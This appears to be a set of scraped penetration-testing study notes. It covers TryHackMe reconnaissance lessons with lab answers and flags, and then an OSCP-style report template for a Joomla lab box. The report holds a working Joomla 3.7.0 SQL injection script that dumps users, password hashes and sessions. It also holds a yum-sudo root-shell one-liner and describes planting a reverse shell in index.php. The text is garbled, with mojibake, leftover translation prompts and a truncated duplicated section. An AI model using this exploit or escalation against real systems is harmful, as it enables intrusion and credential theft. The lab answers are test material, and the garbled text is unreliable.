item.title: 1. Summary
item.description:
Previously, Sun Tzu said, "Know your enemy and know yourself, and you can fight a hundred battles without disaster." The same applies to network security. If you're in the role of an attacker, you need to gather information about the target system. If you're defending, you need to know what the adversary might discover about your system.


Reconnaissance is the preliminary survey for gathering information about a target.
Types of Reconnaissance

Passive Reconnaissance
Active Reconnaissance
Passive reconnaissance relies on publicly available information. It involves gathering information without directly engaging with the target, such as observing from a distance.

Passive reconnaissance activities include:

Querying a public DNS server for the domainâ€™s DNS records.
Checking job postings related to the target website.
Reading news articles about the target company.
On the other hand, active reconnaissance cannot be performed this way. It requires direct interaction with the target, akin to forcibly unlocking a safe.
Active reconnaissance activities include:

Connecting to one of the company's servers, such as HTTP, FTP, or SMTP.
Calling the company to gather information.
Impersonating a repairman to infiltrate the company.
Such methods can result in penalties if performed without proper legal authorization.


WHOIS is a query and response protocol that follows RFC 3912. WHOIS servers listen for incoming requests on TCP port 43. Domain registrars are responsible for maintaining WHOIS records for the domain names they lease. WHOIS servers respond with various information related to the requested domain.
Key information includes:

Registrar: Through which registrar was the domain name registered?
Registrant contact information: Name, organization, address, phone number, etc.
Creation, update, and expiration dates: When was the domain name first registered? When was it last updated? And when does it need to be renewed?
Name servers: What servers should be queried to resolve the domain name?
To obtain this information, you need to use a WHOIS client or an online service. Many online services provide WHOIS information, but generally, using a local WHOIS client is faster and more convenient.
Exercise:

Use the whois tryhackme.com command to obtain the necessary information.

When was TryHackMe.com registered?
Answer: 20180705

Who is the registrar for TryHackMe.com?
Answer: namecheap.com

Which company provides the name servers for TryHackMe.com?
Answer: cloudflare.com



nslookup stands for Name Server Look Up and is used to find the IP address of a domain name. Ex) nslookup DOMAIN_NAME Various options can be added, with the main options listed below:

For example, nslookup -type=A tryhackme.com 1.1.1.1 (or nslookup -type=a tryhackme.com 1.1.1.1 because it is case-insensitive) can be used to return all IPv4 addresses used by tryhackme.com. A and AAAA records are used to return IPv4 and IPv6 addresses, respectively. This lookup is useful from a penetration testing perspective. In the above example, starting with one domain name, you obtained three IPv4 addresses. Each of these IP addresses can be further checked for vulnerabilities, assuming they fall within the penetration test scope. Suppose you want to know about email servers and configurations for a specific domain. You could issue the following example: nslookup -type=MX tryhackme.com.
Exercise:
Check the TXT records of thmlabs.com. What is the flag there?

Answer: THM{a5b83929888ed36acb0272971e438d78}



DNS lookup tools like nslookup and dig cannot find subdomains on their own.
Of course, you can use search engines to find publicly known domain lists, but itâ€™s time-consuming. To avoid this time-consuming search, you can use online services like DNSDumpster.
Searching a siteâ€™s domain on DNSDumpster will reveal subdomains that ordinary DNS queries cannot. DNSDumpster returns the collected DNS information in an easy-to-read table and graph. DNSDumpster also provides information about mail servers.
Exercise:
Query tryhackme.com on DNSDumpster. What is an interesting subdomain you found besides www and blog?
Answer: remote


If you need to perform a penetration test on a specific target as part of the passive reconnaissance phase, you can use services like Shodan.io to obtain various information about the clientâ€™s network without actively connecting to it. From a defensive perspective, you can also use various Shodan.io services to learn about devices connected to and exposed outside your organization.
Shodan.io is unlike a search engine for web pages, as it attempts to connect to all devices that can be connected online. If it receives a response, it collects all information related to the service and stores it in a database for searching. Below is some of the information collected from the tryhackme.com server.

This record shows a web server. However, as mentioned, Shodan.io collects information about any device connected online. A Shodan.io search will reveal at least the record shown in the screenshot above when searching for tryhackme.com. From this Shodan.io search result, you can learn several things related to the search, such as:

IP address
Hosting company
Geographical location
Server type and version
You can also search the IP address obtained from a DNS lookup. However, these are likely to change. You can learn about all the search options available on Shodan.io on their help page.
Exercise



According to Shodan.io, what is the second-highest country in the world in terms of the number of publicly accessible Apache servers?
Answer: Germany

Based on Shodan.io, what is the third most common port used for Apache?
Answer: 8080

Based on Shodan.io, what is the third most commonly used port for Nginx?
Answer: 888


Command Examples

4o

item.title: 2. Active Reconnaissance
item.description:
Here is the text with only the Korean parts translated into English:





Active reconnaissance is the process of gathering information through interaction with the target. It's similar to the image below.

This time, we will explore the process of finding vulnerabilities using various tools.



The web browser is a convenient tool that can be easily used on any system. There are various ways to collect information about a target using a web browser.
The web browser accesses websites as follows:
When accessing a website via HTTP, it typically uses TCP port 80. When accessing a website via HTTPS, it typically uses TCP port 443.
While browsing a page, you can open the developer tools in Firefox by pressing Option + Command + I ( ) on a PC or Mac. You can also use a similar shortcut âŒ¥ + âŒ˜ + I to start Chrome or Chromium. The developer tools allow you to inspect many items received by the browser and exchanged with the remote server. For example, you can view and modify JavaScript (JS) files, inspect cookies set on the system, and explore the folder structure of site content.

There are also many add-ons for Firefox and Chrome that can assist in penetration testing. Here are some examples:
Example

FoxyProxy allows you to quickly change the proxy server used to access the target website. This browser extension is convenient if you regularly need to switch proxy servers or use tools like Burp Suite. You can get FoxyProxy for Firefox here.
User-Agent Switcher and Manager provides the ability to masquerade as if you are accessing a web page from a different operating system or browser. For instance, you can pretend to be browsing a site using an iPhone even though you are actually using Mozilla Firefox. You can download User-Agent Switcher and Manager for Firefox here.
Wappalyzer provides insights into the technologies used on the visited website. This extension is especially handy for collecting all this information while browsing the site like any other user. You can find Wappalyzer for Firefox here.


Ping is reminiscent of a ping pong game. You throw the ball and expect it to come back. The primary purpose of ping is to check whether a remote system can connect back to the user, i.e., it was originally used to verify network connectivity. However, we are more interested in the various uses of ping to verify if the remote system is online.
In simple terms, the ping command sends packets to a remote system, and the remote system responds. This allows you to conclude that the remote system is online and that the network is functioning between the two systems.
You can use ping on the AttackBox terminal as ping MACHINE_IP or ping HOSTNAME. In the latter case, the system will resolve HOSTNAME to an IP address before sending ping packets. On a Linux system, if you don't specify a count, you must press CTRL+c to forcibly stop it. Therefore, you might consider sending only 10 packets with ping -c 10 MACHINE_IP. This is the same as ping -n 10 MACHINE_IP on MS Windows systems.
Technically speaking, ping belongs to the ICMP (Internet Control Message Protocol).
Using ping, we can determine whether communication with the host is normal and if the PC is operational.
If you do not receive a ping response, there are several explanations for why you might not have received it. For example:
Example

The target computer is not responding. It might still be booting, turned off, or the OS may have crashed.
It has been disconnected from the network, or a network device along the route is faulty.
A firewall is configured to block such packets. The firewall could be software running on the system itself or a separate network appliance. By default, the MS Windows firewall blocks ping.
The system has been disconnected from the network.


The traceroute command tracks the path that packets take from your system to another host. The purpose of traceroute is to find the IP addresses of the routers or hops that packets pass through as they travel from your system to the target host. This command also indicates the number of routers between the two systems. It is useful because it shows the number of hops (routers) between your system and the target host. However, since many routers use dynamic routing protocols that adapt to network changes, the path that packets take can change.
The command used on Linux and macOS is traceroute 10.10.132.220, and on MS Windows, it is tracert 10.10.132.220. These commands attempt to discover the routers on the path from your system to the target system.

However, when the TTL reaches 0, the packet is discarded, and an ICMP TTL (Time-to-Live) exceeded message is sent back to the original sender. In the next figure, the system sets TTL to 1 before sending the packet to the router. The first router on the path decreases the TTL by 1, making it 0. As a result, this router discards the packet and sends an ICMP time exceeded message. Some routers are configured not to send these ICMP messages when discarding packets.

On Linux, traceroute begins by sending a UDP datagram with a TTL of 1 inside an IP packet. Therefore, when the first router encounters TTL=0, it returns an ICMP TTL exceeded message. Thus, when TTL is 1, the IP address of the first router is revealed. Then it sends another packet with TTL=2. This packet is discarded at the second router, and so on. Let's try this on a live system.
In the following example, we run the same command on TryHackMe's AttackBox: traceroute tryhackme.com. If the execution is different, the path that the packets take may vary.
Traceroute A
AttackBox Terminal - Traceroute A
user@AttackBox$ traceroute tryhackme.com
traceroute to tryhackme.com (172.67.69.208), 30 hops max, 60 byte packets
1 ec2-3-248-240-5.eu-west-1.compute.amazonaws.com (3.248.240.5) 2.663 ms * ec2-3-248-240-13.eu-west-1.compute.amazonaws.com (3.248.240.13) 7.468 ms
2 100.66.8.86 (100.66.8.86) 43.231 ms 100.65.21.64 (100.65.21.64) 18.886 ms 100.65.22.160 (100.65.22.160) 14.556 ms
3 100.66.16.176 (100.66.16.176) 8.006 ms
4 100.66.11.34 (100.66.11.34) 17.401 ms 100.66.10.14 (100.66.10.14) 23.614 ms 100.66.19.236 (100.66.19.236) 17.524 ms
5 100.66.7.35 (100.66.7.35) 12.808 ms 100.66.6.109 (100.66.6.109) 14.791 ms *
6 100.65.14.131 (100.65.14.131) 1.026 ms 100.66.5.189 (100.66.5.189) 19.246 ms 100.66.5.243 (100.66.5.243) 19.805 ms
7 100.65.13.143 (100.65.13.143) 14.254 ms 100.95.18.131 (100.95.18.131) 0.944 ms 100.95.18.129 (100.95.18.129) 0.778 ms
8 100.95.2.143 (100.95.2.143) 0.680 ms 100.100.4.46 (100.100.4.46) 1.392 ms 100.95.18.143 (100.95.18.143) 0.878 ms
9 100.100.20.76 (100.100.20.76) 7.819 ms 100.92.11.36 (100.92.11.36) 18.669 ms 100.100.20.26 (100.100.
10 100.92.11.112 (100.92.11.112) 17.852 ms * 100.92.11.158 (100.92.11.158) 16.687 ms
11 100.92.211.82 (100.92.211.82) 19.713 ms 100.92.0.126 (100.92.0.126) 18.603 ms 52.93.112.182 (52.93.112.182) 17.738 ms
12 99.83.69.207 (99.83.69.207) 17.603 ms 15.827 ms 17.351 ms
13 100.92.9.83 (100.92.9.83) 17.894 ms 100.92.79.136 (100.92.79.136) 21.250 ms 100.92.9.118 (100.92.9.118) 18.166 ms
14 172.67.69.208 (172.67.69.208) 17.976 ms 16.945 ms 100.92.9.3 (100.92.9.3) 17.709 ms
The above traceroute output contains 14 numbered lines, with each line representing a single router/hop. Our system sends three packets with TTL set to 1, followed by three packets with TTL set to 2, and so on. Depending on the network topology and the path taken by the packets, we may receive responses from up to three different routers. Considering line 12, the 12th router listed with the IP address in line 12 deleted the packets three times and sent an ICMP time-exceeded message. The line shows how long it took (in milliseconds) for each reply to reach the system.
On the other hand, we can see that only a single response was received on the third line. The two asterisks in the output indicate that the system did not receive the expected ICMP time-exceeded messages.
Finally, on the first line of the output, we see that the packet leaving the AttackBox takes a different path. We observe two routers responding with TTL of one. Our system did not receive the third expected ICMP message.
Path Trace B
AttackBox Terminal - Traceroute B
user@AttackBox$ traceroute tryhackme.com
traceroute to tryhackme.com (104.26.11.229), 30 hops max, 60 byte packets
1 ec2-79-125-1-9.eu-west-1.compute.amazonaws.com (79.125.1.9) 1.475 ms * ec2-3-248-240-31.eu-west-1.compute.amazonaws.com (3.248.240.31) 9.456 ms
2 100.65.20.160 (100.65.20.160) 16.575 ms 100.66.8.226 (100.66.8.226) 23.241 ms 100.65.23.192 (100.65.23.192) 22.267 ms
3 100.66.16.50 (100.66.16.50) 2.777 ms 100.66.11.34 (100.66.11.34) 22.288 ms 100.66.16.28 (100.66.16.28) 4.421 ms
4 100.66.6.47 (100.66.6.47) 17.264 ms 100.66.7.161 (100.66.7.161) 39.562 ms 100.66.10.198 (100.66.10.198) 15.958 ms
5 100.66.5.123 (100.66.5.123) 20.099 ms 100.66.7.239 (100.66.7.239) 19.253 ms 100.66.5.59 (100.66.5.59) 15.397 ms
6 * 100.66.5.223 (100.66.5.223) 16.172 ms 100.65.15.135 (100.65.15.135) 0.424 ms
7 100.65.12.135 (100.65.12.135) 0.390 ms 100.65.12.15 (100.65.12.15) 1.045 ms 100.65.14.15 (100.65.14.15) 1.036 ms
8 100.100.4.16 (100.100.4.16) 0.482 ms 100.100.20.122 (100.100.20.122) 0.795 ms 100.95.2.143 (100.95.2.143) 0.827 ms
9 100.100.20.86 (100.100.20.86) 0.442 ms 100.100.4.78 (100.100.4.78) 0.347 ms 100.100.20.20 (100.100.20.20) 1.388 ms
10 100.92.212.20 (100.92.212.20) 11.611 ms 100.92.11.54 (100.92.11.54) 12.675 ms 100.92.11.56 (100.92.11.56) 10.835 ms
11 100.92.6.52 (100.92.6.52) 11.427 ms 100.92.6.50 (100.92.6.50) 11.033 ms 100.92.210.50 (100.92.210.50) 10.551 ms
12 100.92.210.139 (100.92.210.139) 10.026 ms 100.92.6.13 (100.92.6.13) 14.586 ms 100.92.210.69 (100.92.210.69) 12.032 ms
13 100.92.79.12 (100.92.79.12) 12.011 ms 100.92.79.68 (100.92.79.68) 11.318 ms 100.92.80.84 (100.92.80.84) 10.496 ms
14 100.92.9.27 (100.92.9.27) 11.354 ms 100.92.80.31 (100.92.80.31) 13.000 ms 52.93.135.125 (52.93.135.125) 11.412 ms
15 150.222.241.85 (150.222.241.85) 9.660 ms 52.93.135.81 (52.93.135.81) 10.941 ms 150.222.241.87 (150.222.241.87) 16.543 ms
16 100.92.228.102 (100.92.228.102) 15.168 ms 100.92.227.41 (100.92.227.41) 10.134 ms 100.92.227.52 (100.92.227.52) 11.756 ms
17 100.92.232.111 (100.92.232.111) 10.589 ms 100.92.231.69 (100.92.231.69) 16.664 ms 100.92.232.37 (100.92.232.37) 13.089 ms
18 100.91.205.140 (100.91.205.140) 11.551 ms 100.91.201.62 (100.91.201.62) 10.246 ms 100.91.201.36 (100.91.201.36) 11.368 ms
19 100.91.205.79 (100.91.205.79) 11.112 ms 100.91.205.83 (100.91.205.83) 11.040 ms 100.91.205.33 (100.91.205.33) 10.114 ms
20 100.91.211.45 (100.91.211.45) 9.486 ms 100.91.211.79 (100.91.211.79) 13.693 ms 100.91.211.47 (100.91.211.47) 13.619 ms
21 100.100.6.81 (100.100.6.81) 11.522 ms 100.100.68.70 (100.100.68.70) 10.181 ms 100.100.6.21 (100.100.6.21) 11.687 ms
22 100.100.65.131 (100.100.65.131) 11.207 ms 100.100.61.19 (100.100.61.19) 10.451 ms 104.26.11.229 (104.26.11.229) 10.998 ms
23 100.100.2.74 (100.100.2.74) 15.317 ms 100.100.66.17 (100.100.66.17) 11.492 ms 100.100.88.67 (100.100.88.67) 35.312 ms
24 100.100.16.16 (100.100.16.16) 19.155 ms 100.100.16.28 (100.100.16.28) 19.147 ms 100.100.2.68 (100.100.2.68) 13.718 ms
25 99.83.89.19 (99.83.89.19) 28.929 ms * 21.790 ms
26 104.26.11.229 (104.26.11.229) 11.070 ms 11.058 ms 11.982 ms

In the second execution of the traceroute program, we observe that the packet traveled a longer route, passing through 26 routers. When running traceroute on a system within a network, the route may not change. However, if the packet has to travel through external routers outside the network, the route cannot be expected to remain fixed.
In summary, we can observe the following:

The number of hops/routers between the system and the target system can vary depending on the time at which traceroute is executed. Even if you are on the same network or repeat the traceroute command within a short period, there is no guarantee that the packet will always follow the same route.
Some routers return public IP addresses. Depending on the scope of the intended penetration test, some of these routers may be inspected.
Some routers do not return a response.


The TELNET (Teletype Network) protocol was developed in 1969 to communicate with remote systems through a command-line interface (CLI). Therefore, this command uses the TELNET protocol for remote management via Telnet. The default port used by Telnet is 23. From a security perspective, Telnet sends all data, including usernames and passwords, in plain text. Sending in plain text allows anyone with access to the communication channel to easily steal login credentials. A secure alternative is the SSH (Secure Shell) protocol.
However, since the Telnet client is simple, it can be used for other purposes. Knowing that the Telnet client relies on the TCP protocol, you can use Telnet to connect to any service and retrieve its banner. By using telnet 10.10.132.220 PORT, you can connect to any service running on TCP at 10.10.132.220 PORT, and you can exchange a few messages as long as encryption is not being used.
Let's assume you want to retrieve detailed information about a web server listening on port 80. You connect to the server on port 80 and then communicate using the HTTP protocol. There is no need to dive into the HTTP protocol; simply issue GET / HTTP/1.1. If you want to specify something other than the default index page, you can request GET /page.html HTTP/1.1. Additionally, youâ€™ve specified that the remote web server uses HTTP version 1.1 for communication. To receive a valid response instead of an error, you must input some value for the host (e.g., host: example) and press Enter twice. Following these steps will result in the requested index page being served.
Penetration Tester Terminal
pentester@TryHackMe$ telnet 10.10.132.220 80
Trying 10.10.132.220...
Connected to MACHINE_IP.
Escape character is '^]'.
GET / HTTP/1.1
host: telnet
HTTP/1.1 200 OK
Server: nginx/1.6.2
Date: Tue, 17 Aug 2021 11:13:25 GMT
Content-Type: text/html
Content-Length: 867
Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT
Connection: keep-alive
ETag: "611b9990-363"
Accept-Ranges: bytes
What we need to note is the type and version of the installed web server, identified as Server: nginx/1.6.2. In this example, since we are communicating with a web server, we used basic HTTP commands. To connect to a mail server, appropriate commands should be used according to the protocol, such as SMTP or POP3.


Netcat, or simply nc, offers various applications that can be of great value to penetration testers. Netcat supports both the TCP and UDP protocols. It can operate as a client connecting to a listening port, or it can act as a server listening on a selected port. Therefore, it is a convenient tool that can be used as a simple client or server over TCP or UDP.
First, you can connect to a server and collect banners using nc 10.10.132.220 PORT, as you did with telnet 10.10.132.220 PORT. You might need to press SHIFT+ENTER after the GET line.
Penetration Tester Terminal
bash
ì½”ë“œ ë³µì‚¬
pentester@TryHackMe**$** nc 10.10.132.220 80 GET / HTTP/1.1 host: netcat HTTP/1.1 200 OK Server: nginx/1.6.2 Date: Tue, 17 Aug 2021 11:39:49 GMT Content-Type: text/html Content-Length: 867 Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT Connection: keep-alive ETag: "611b9990-363" Accept-Ranges: bytes
In the terminal shown above, we used Netcat to connect to port 80 on MACHINE_IP with the command nc 10.10.132.220 80. We then executed a GET request for the default page using GET / HTTP/1.1. The client is specifying that the target server supports HTTP version 1.1. Finally, since you need to specify a name for the host, you enter host: netcat on a new line; the host name can be arbitrary as it wonâ€™t impact this exercise.
Based on the received output, you can see that Nginx version 1.6.2 is handling incoming connections on port 80, identified by Server: nginx/1.6.2.
Below are the command options:


The -p option must appear immediately before the port number to be received.
The -n option prevents DNS lookups and warnings.
Root privileges are required to receive port numbers below 1024.

The Offensive Security Lab and Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network. The student is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.

The student will be required to fill out this penetration testing report fully and to include the following sections:
Â·         Overall High-Level Summary and Recommendations (non-technical)
Â·         Methodology walkthrough and detailed outline of steps taken
Â·         Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
Â·         Any additional items that were not included

â—        192.168.xx.xx (hostname) - Name of initial exploit
â—        192.168.xx.xx (hostname) - BOF


I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Exam environments is secured. Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

Exam Network




Nmap Scan Results:
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
Initial Shell Vulnerability Exploited
Additional info about where the initial shell was acquired from
Vulnerability Explanation: SQL Injection Vulnerability in Joomla! 3.7
Joomla! 3.7.0 is vulnerable to SQL INJECTION attack. This vulnerability is easy to exploit and does not require a privileged account on the victim site.
Vulnerability Fix : Update to 3.7.1
This vulnerability has been fixed since version 3.7.1. Please update it to version 3.7.1 or higher to fix the vulnerability.
Severity(**ì‹¬ê°ë„)**:  Severe
Steps to reproduce the attack:
Initial service discovery read README files from a web server and found that the server you are hosting is version Joomla 3.7.0. The vulnerability in version 3.7.0 downloaded the expoit from https://github.com/stefanlucas/Exploit-Joomla to proceed with the attack, and then found out the username, mail, and password hash. You can see that the hash started with $2, so it was encrypted with bcrypt. Therefore, we decrypted it with bcrpyt and got the password spider123.
Python joomblah.py http://10.10.182.202


Afterwards, the infiltration was successful by accessing the web server cms and replacing the contents of index.php with a reverse shell.

Proof of Concept Code Here:
#!/usr/bin/python
from future import print_function
import requests
import sys
import re
import argparse
import os
import random
import time
import binascii
def extract_token(resp):
                  match = re.search(r'name="([a-f0-9]{32})" value="1"', resp.text, re.S)
                  if match is None:
                                    print(" [!] Cannot find CSRF token")
                                    return None
                  return match.group(1)
def parse_options():
                  parser = argparse.ArgumentParser(description='Jooma Exploit')
                  parser.add_argument('url', help='Base URL for Joomla site')
                  return parser.parse_args()
def build_sqli(colname, morequery):
                  return "(SELECT " + colname + " " + morequery + ")"
def joomla_370_sqli_extract(options, sess, token, colname, morequery):
                  sqli = build_sqli("LENGTH("+colname+")", morequery)
                  length = joomla_370_sqli(options, sess, token, sqli)
                  if not length:
                                    return None
                  length = int(length)
                  maxbytes = 30
                  offset = 0
                  result = ''
                  while length > offset:
                                    sqli = build_sqli("HEX(MID(%s,%d,%d))" % (colname, offset + 1, 16), morequery)
                                    value = joomla_370_sqli(options, sess, token, sqli)
                                    if not value:
                                                     print(" [!] Failed to retrieve string for query:", sqli)
                                                     return None
                                    value = binascii.unhexlify(value).decode("utf-8")
                                    result += value
                                    offset += len(value)
                  return result
def joomla_370_sqli(options, sess, token, sqli):
                  sqli_full = "UpdateXML(2, concat(0x3a," + sqli + ", 0x3a), 1)"
                  data = {
                                    'option': 'com_fields',
                                    'view': 'fields',
                                    'layout': 'modal',
                                    'list[fullordering]': sqli_full,
                                    token: '1',
                  }
                  resp = sess.get(options.url + "/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False)
                  match = re.search(r'XPATH syntax error:\s'($\n+)\s'\s*</bl', resp.text, re.S)
                  if match:
                                    match = match.group(1).strip()
                                    if match[0] != ':' and match[-1] != ':':
                                                     return None
                                    return match[1:-1]
def extract_joomla_tables(options, sess, token):
                  tables = list()
                  first = False
                  offset = 0
                  while True:
                                    result = joomla_370_sqli_extract(options, sess, token, "TABLE_NAME", "FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT " + str(offset) + ",1" )
                                    if result is None:
                                                     if first:
                                                                       print("[!] Failed to retrieve first table name!")
                                                                       return False
                                                     break
                                    tables.append(result)
                                    print("  -  Found table:", result)
                                    first = False
                                    offset += 1
                  return tables
def extract_joomla_users(options, sess, token, table_name):
                  users = list()
                  offset = 0
                  first = False
                  print("  -  Extracting users from", table_name)
                  while True:
                                    result = joomla_370_sqli_extract(options, sess, token, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)", "FROM %s ORDER BY registerDate ASC LIMIT %d,1" % (table_name, offset) )                     
                                    if result is None:
                                                     if first:
                                                                       print("[!] Failed to retrieve user from table!")
                                                                       return False
                                                     break
                                    result = result.split('|')
                                    print(" [$] Found user",result)
                                    first = False
                                    offset += 1
                                    users.append(result)
                  return users
def extract_joomla_sessions(options, sess, token, table_name):
                  sessions = list()
                  offset = 0
                  first = False
                  print("  -  Extracting sessions from", table_name)
                  while True:
                                    result = joomla_370_sqli_extract(options, sess, token, "CONCAT(userid,0x7c,session_id,0x7c,username)", "FROM %s WHERE guest = 0 LIMIT %d,1" % (table_name, offset) )                     
                                    if result is None:
                                                     if first:
                                                                       print("[!] Failed to retrieve session from table!")
                                                                       return False
                                                     break
                                    result = result.split('|')
                                    print(" [$] Found session", result)
                                    first = False
                                    offset += 1
                                    sessions.append(result)
                  return sessions
def pwn_joomla_again(options):
                  sess = requests.Session()
                  print(" [-] Fetching CSRF token")
                  resp = sess.get(options.url + "/index.php/component/users/?view=login")
                  token = extract_token(resp)
                  if not token:
                                    return False
                  # Verify that we can perform SQLi
                  print(" [-] Testing SQLi")        
                  result = joomla_370_sqli(options, sess, token, "128+127")        
                  if result != "255":
                                    print(" [!] Could not find SQLi output!")
                                    return False
                  tables = extract_joomla_tables(options, sess, token)
                  for table_name in tables:
                                    table_prefix = table_name[:-5]
                                    extract_joomla_users(options, sess, token, table_name)
                                    extract_joomla_sessions(options, sess, token, table_prefix + 'session')
                  return True
def print_logo():
                  clear = "\x1b[0m"
                  colors = [31, 32, 33, 34, 35, 36]
                  logo = """                                                                                                                   
    .---.    .-'''-.        .-'''-.                                                          
    |   |   '       \     '       \                            .---.                       
    '---' /   / '.   \  /   / '.   \  __     _   /|        |   |            .          
    .---..   |     \  ' .   |     \  ' |  |/  .'   . ||        |   |          .'|          
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |          
    |   |\    \     / / \    \     / / |  |  |  |  |  |||      |   |        | |          
    |   | .    ..' /   .    ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.   
    **|   |    '-...-'       '-...-'   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. **  
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |  
    |   |                              ||  ||  |__|||\    / '|   | .'.''| | | |     | |  
 _.'   '                                              |/'..' / '---'/ /   | || |     | |  
|      '                                               '  '-'       \ ._,\ '/| '.    | '. 
|____.'                                                                --'  " '---'   '---'
"""
                  for line in logo.split("\n"):
                                    sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
                                    #time.sleep(0.05)
def main(base_url): 
                  options = parse_options()
                  options.url = options.url.rstrip('/')
                  print_logo()
                  pwn_joomla_again(options)
if name == "main":
                  sys.exit(main("http://192.168.10.100:8080/joomla"))

Additional Priv Esc info
Vulnerability Exploited:
Vulnerability Explanation(**ì·¨ì•½ì„± ì„¤ëª…)**:  yum sudo vulnerability
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
Vulnerability Fix:
We are currently distributing the latest version that improves this vulnerability, so you can resolve the vulnerability by updating the version.
Severity: Important
Steps to reproduce the attack:
After connecting to the system, I checked and found that I had apache permissions, but I could not access the jjameson folder or the root folder. I didn't have permission to run sudo -l, and there was nothing in crontab to escalate to change permissions.


As a result, the password I used to access the existing website was of no use. After checking some directories and files, Iâ€™ve headed to the website directory to check the configuration files:
The â€˜configuration.phpâ€™ file sounded interesting, so after a check, Iâ€™ve got some credentials:

they arenâ€™t useful for the root user, but maybe we can use them with the jjameson user:

We can see that we can uso yum with sudo privileges. Letâ€™s check the gtfobins to see if there is a way of exploiting this in order to escalate our privileges

When an attack was carried out using the exploit described above, privileges were successfully stolen:
[jjameson@dailybugle ~]$ TF=$(mktemp -d) [jjameson@dailybugle ~]$ cat >$TF/x<<EOF > [main] > plugins=1 > pluginpath=$TF > pluginconfpath=$TF > EOF [jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF > [main] > enabled=1 > EOF [jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF > import os > import yum > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE > requires_api_version='2.1' > def init_hook(conduit): >   os.execl('/bin/sh','/bin/sh') > EOF [jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y ë³µì‚¬
In Result

Exploit Code:
[jjameson@dailybugle ~]$ TF=$(mktemp -d) [jjameson@dailybugle ~]$ cat >$TF/x<<EOF > [main] > plugins=1 > pluginpath=$TF > pluginconfpath=$TF > EOF [jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF > [main] > enabled=1 > EOF [jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF > import os > import yum > from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE > requires_api_version='2.1' > def init_hook(conduit): >   os.execl('/bin/sh','/bin/sh') > EOF [jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y ë³µì‚¬

The Offensive Security Lab and Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

The objective of this assessment is to perform an internal penetration test against the Offensive Security Lab and Exam network. The student is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report. An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course. Use the sample report as a guideline to get you through the reporting.

The student will be required to fill out this penetration testing report fully and to include the following sections:
Â·         Overall High-Level Summary and Recommendations (non-technical)
Â·         Methodology walkthrough and detailed outline of steps taken
Â·         Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
Â·         Any additional items that were not included

â—        192.168.xx.xx (hostname) - Name of initial exploit
â—        192.168.xx.xx (hostname) - Name of initial exploit
â—        192.168.xx.xx (hostname) - Name of initial exploit
â—        192.168.xx.xx (hostname) - Name of initial exploit
â—        192.168.xx.xx (hostname) - BOF


I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Exam environments is secured. Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

Exam Network




Nmap Scan Results:
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
Initial Shell Vulnerability Exploited
Additional info about where the initial shell was acquired from
Vulnerability Explanation: SQL Injection Vulnerability in Joomla! 3.7
Joomla! 3.7.0 is vulnerable to SQL INJECTION attack. This vulnerability is easy to exploit and does not require a privileged account on the victim site.
Vulnerability Fix : Update to 3.7.1
This vulnerability has been fixed since version 3.7.1. Please update it to version 3.7.1 or higher to fix the vulnerability.
Severity(**ì‹¬ê°ë„)**:  Severe
Steps to reproduce the attack:
Initial service discovery read README files from a web server and found that the server you are hosting is version Joomla 3.7.0. The vulnerability in version 3.7.0 downloaded the expoit from https://github.com/stefanlucas/Exploit-Joomla to proceed with the attack, and then found out the username, mail, and password hash. You can see that the hash started with $2, so it was encrypted with bcrypt. Therefore, we decrypted it with bcrpyt and got the password spider123.
Python joomblah.py http://10.10.182.202


Afterwards, the infiltration was successful by accessing the web server cms and replacing the contents of index.php with a reverse shell.

Proof of Concept Code Here:
#!/usr/bin/python
from future import print_function
import requests
import sys
import re
import argparse
import os
import random
